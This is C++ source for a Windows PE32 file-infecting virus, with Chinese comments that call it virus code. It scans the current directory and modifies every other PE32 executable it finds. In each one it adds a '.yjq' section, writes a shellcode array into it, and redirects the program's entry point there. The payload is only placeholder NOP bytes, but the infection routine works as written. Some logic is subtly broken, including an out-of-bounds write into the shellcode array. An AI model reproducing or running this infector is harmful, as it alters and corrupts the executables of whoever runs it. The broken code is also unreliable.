#include <Windows.h>
#include <dirent.h>
#include <io.h>
#include <fstream>
#include <iostream>
#include <stdio.h>
#include <tchar.h>
#include <string.h>

using namespace std;
PIMAGE_NT_HEADERS32 pNtHeaders;
PIMAGE_SECTION_HEADER sectionHeader;
DWORD PosOfNtHeaders;
int NumofSection;
int codeLength;
DWORD pointerOfRawData;
DWORD sizeOfRawData;
DWORD virtualAddress;
DWORD virtualSize;

unsigned char shellcode[] = {  // 病毒代码字节码
    0x90, 0x90, 0x90, 0x90, 0x90};

void getNtHeaders(HANDLE hFile) {  // 获取NT头
    WORD dwTempRead;
    DWORD dwReadInFactSize;
    BOOL bRead;

    DWORD dwSize = offsetof(IMAGE_DOS_HEADER, e_lfanew);
    SetFilePointer(hFile, dwSize, NULL, FILE_BEGIN);

    //读取得到e_lfanew成员的内容,也就是PE头在文件中的偏移
    bRead = ReadFile(hFile, &dwTempRead, sizeof(WORD), &dwReadInFactSize, NULL);
    if (!bRead || sizeof(WORD) != dwReadInFactSize) {
        CloseHandle(hFile);
        return;
    }
    SetFilePointer(hFile, dwTempRead, NULL, FILE_BEGIN);
    PosOfNtHeaders = dwTempRead;
    //读取PE标志，NtHeader是定义的一个结构体对象
    PIMAGE_NT_HEADERS32 NtHeader =
        (PIMAGE_NT_HEADERS32)malloc(sizeof(IMAGE_NT_HEADERS32));
    //把整个PE头结构读取
    bRead =
        ReadFile(hFile, NtHeader, sizeof(*NtHeader), &dwReadInFactSize, NULL);
    if (!bRead || sizeof(*NtHeader) != dwReadInFactSize) {
        CloseHandle(hFile);
        return;
    }
    pNtHeaders = NtHeader;
}

bool isPE32(HANDLE hFile) {  // 判断是否是PE文件
    // first check whether it is a  PE file
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    WORD dwTempRead;
    DWORD dwReadInFactSize;
    BOOL bRead =
        ReadFile(hFile, &dwTempRead, sizeof(WORD), &dwReadInFactSize, NULL);
    if (!bRead || sizeof(WORD) != dwReadInFactSize) {
        CloseHandle(hFile);
        return FALSE;
    }
    if (dwTempRead != 0x5a4d) {
        CloseHandle(hFile);
        return FALSE;
    }
    if (pNtHeaders->OptionalHeader.Magic != 0x10b) {
        CloseHandle(hFile);
        return FALSE;
    }

    if (pNtHeaders->Signature != 0x4550) {
        CloseHandle(hFile);
        return FALSE;
    }
    //该文件属于PE格式,返回TRUE.
    return TRUE;
}

void processNtHeaders(HANDLE hFile) {  // 更新NT头中的部分内容
    codeLength = sizeof(shellcode);
    NumofSection = pNtHeaders->FileHeader.NumberOfSections;  // 存储原节数
    pNtHeaders->FileHeader.NumberOfSections += 1;            // 增加一节
    // pNtHeaders->OptionalHeader.SizeOfCode += codeLength;     //更新sizeofCode
    pNtHeaders->OptionalHeader.SizeOfImage += 0x1000;  // 更新 sizeofImage
}

bool isInfected(HANDLE hFile) {  // 判断是否感染
    SetFilePointer(hFile, PosOfNtHeaders + sizeof(IMAGE_NT_HEADERS32), NULL,
                   FILE_BEGIN);
    for (int i = 0; i < NumofSection; i++) {
        WORD dwTempRead;
        DWORD dwReadInFactSize;
        IMAGE_SECTION_HEADER tempSection;
        BOOL bRead = ReadFile(hFile, &tempSection, sizeof(IMAGE_SECTION_HEADER),
                              &dwReadInFactSize, NULL);
        if (strcmp((char*)tempSection.Name, ".yjq") == 0) {
            return true;
        }
        if (!bRead || sizeof(tempSection) != dwReadInFactSize) {
            printf("读取文件头出错\n");
            return false;
        }
    }
    return false;
}

void getLastSectionHeader(HANDLE hFile) {  // 找到最后一个section header
    // 此时文件指针在首个section headers处
    SetFilePointer(
        hFile,
        PosOfNtHeaders + sizeof(IMAGE_NT_HEADERS32) + (NumofSection - 1) * 0x28,
        NULL,
        FILE_BEGIN);  // 这个用的绝对的
    IMAGE_SECTION_HEADER pLastSectionHeader;
    WORD dwTempRead;
    DWORD dwReadInFactSize;
    BOOL bRead =
        ReadFile(hFile, &pLastSectionHeader, sizeof(IMAGE_SECTION_HEADER),
                 &dwReadInFactSize, NULL);

    // pLastSectionHeader.Name[0] = 'y';
    // pLastSectionHeader.Name[1] = 'j';
    // pLastSectionHeader.Name[2] = 'q';
    // SetFilePointer(hFile, PosOfNtHeaders + sizeof(IMAGE_NT_HEADERS32), NULL,
    //                FILE_BEGIN);
    // WriteFile(hFile, &pLastSectionHeader, sizeof(IMAGE_SECTION_HEADER),
    //           &dwReadInFactSize, NULL);

    pointerOfRawData = pLastSectionHeader.PointerToRawData;
    sizeOfRawData = pLastSectionHeader.SizeOfRawData;
    virtualAddress = pLastSectionHeader.VirtualAddress;
    virtualSize = pLastSectionHeader.Misc.VirtualSize;
    // cout << pointerOfRawData << ',' << sizeOfRawData << endl;
}

void addNewSectionHeader(HANDLE hFile) {  // 添加一个section header
    codeLength = sizeof(shellcode);
    sectionHeader = (PIMAGE_SECTION_HEADER)malloc(sizeof(IMAGE_SECTION_HEADER));
    sectionHeader->Name[0] = '.';
    sectionHeader->Name[1] = 'y';
    sectionHeader->Name[2] = 'j';
    sectionHeader->Name[3] = 'q';
    sectionHeader->Name[4] = '\0';
    sectionHeader->VirtualAddress =
        virtualAddress + (virtualSize + 0x1000 - 1) / 0x1000 * 0x1000;
    sectionHeader->Misc.VirtualSize = codeLength;  // 这里还不知道codelength多长
    sectionHeader->SizeOfRawData =
        (sectionHeader->Misc.VirtualSize + 0x200 - 1) / 0x200 * 0x200;
    sectionHeader->Characteristics = 0xE0000000;
    sectionHeader->SizeOfRawData = (codeLength + 0x200 - 1) / 0x200 * 0x200;
    sectionHeader->PointerToRawData = pointerOfRawData + sizeOfRawData;
    SetFilePointer(
        hFile,
        PosOfNtHeaders + sizeof(IMAGE_NT_HEADERS32) + NumofSection * 0x28, NULL,
        FILE_BEGIN);
    DWORD dwWriteInFactSize;
    BOOL bWrite = WriteFile(hFile, sectionHeader, sizeof(IMAGE_SECTION_HEADER),
                            &dwWriteInFactSize, NULL);
    if (!bWrite || sizeof(IMAGE_SECTION_HEADER) != dwWriteInFactSize) {
        printf("写入节表头失败\n");
        return;
    }
}

void changeEntrance(HANDLE hFile) {  // 修改程序入口,并且将老地址存入shellcode中
    DWORD oldEntry = pNtHeaders->OptionalHeader.AddressOfEntryPoint;
    // printf("%x\n", oldEntry);
    shellcode[sizeof(shellcode) - 6] = oldEntry;
    oldEntry >>= 8;
    // printf("%x\n", oldEntry);
    shellcode[sizeof(shellcode) - 5] = oldEntry;
    oldEntry >>= 8;
    // printf("%x\n", oldEntry);
    shellcode[sizeof(shellcode) - 4] = oldEntry;
    oldEntry >>= 8;
    // printf("%x\n", oldEntry);
    shellcode[sizeof(shellcode) - 3] = oldEntry;
    pNtHeaders->OptionalHeader.AddressOfEntryPoint =
        sectionHeader->VirtualAddress;
    DWORD dwWriteInFactSize;  // 写入NTheaders
    BOOL bWrite;
    SetFilePointer(hFile, PosOfNtHeaders, NULL, FILE_BEGIN);
    bWrite = WriteFile(hFile, pNtHeaders, sizeof(*pNtHeaders),
                       &dwWriteInFactSize, NULL);
    if (!bWrite || sizeof(IMAGE_NT_HEADERS32) != dwWriteInFactSize) {
        printf("写入nt头失败\n");
        return;
    }
}

void addNewSection(HANDLE hFile) {  // 将shellcode写入新节
    SetFilePointer(hFile, pointerOfRawData + sizeOfRawData, NULL, FILE_BEGIN);
    DWORD dwWriteInFactSize;

    BOOL bWrite = WriteFile(hFile, shellcode, sizeof(shellcode),
                            &dwWriteInFactSize, NULL);
    if (!bWrite || sizeof(shellcode) != dwWriteInFactSize) {
        printf("写入shellcode失败\n");
        return;
    }
}

void process(char filename[]) {  // 一个统筹处理函数
    HANDLE hFile =
        CreateFile(filename, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ,
                   NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    if (hFile == NULL || hFile == INVALID_HANDLE_VALUE) {
        printf("打开文件失败\n");
        return;
    }

    getNtHeaders(hFile);

    if (!isPE32(hFile)) {
        printf("%s不是一个PE32文件\n", filename);
        return;
    }
    printf("%s是一个PE32件,正在感染\n", filename);
    processNtHeaders(hFile);

    if (isInfected(hFile)) {
        printf("%s已经被感染,不再重复感染\n", filename);
        return;
    }

    getLastSectionHeader(hFile);
    addNewSectionHeader(hFile);
    changeEntrance(hFile);
    addNewSection(hFile);

    // processNtHeaders(hFile);

    free(pNtHeaders);  // 记得最后要释放内存
    free(sectionHeader);
    CloseHandle(hFile);  // 关闭句柄
    printf("%s感染成功\n", filename);
    // printf("%d", isPE(hFile));
}

void listdir(char* path, char* filename) {  // 遍历当前目录下所有PE文件
    struct _finddata_t fa;
    long handle;
    char temppath[1024];
    if ((handle = _findfirst(path, &fa)) == -1L) {
        printf("get path %s wrong \n", path);
        return;
    }
    do {
        if (strcmp(fa.name, filename) == 0) {
            continue;
        }
        if ((fa.attrib == _A_ARCH || _A_HIDDEN || _A_RDONLY || _A_SYSTEM ||
             _A_SUBDIR) &&
            strcmp(fa.name, ".") && strcmp(fa.name, "..")) {
            strcpy(temppath, path);
            temppath[strlen(temppath) - 1] = '\0';
            if (fa.attrib == _A_SUBDIR) {
                strcat(temppath, fa.name);
                // listdir(strcat(temppath, "\\*"), filename);
                // printf("into %s", strcat(path, fa.name));
            } else {
                strcat(temppath, fa.name);
                // puts(temppath);
                process(temppath);
            }
        }
    } while (_findnext(handle, &fa) == 0);
    _findclose(handle);
}

int main(int args, char* argv[]) {  // 主函数
    char dir[] = ".\\*";
    listdir(dir, argv[0]);
    system("PAUSE");
}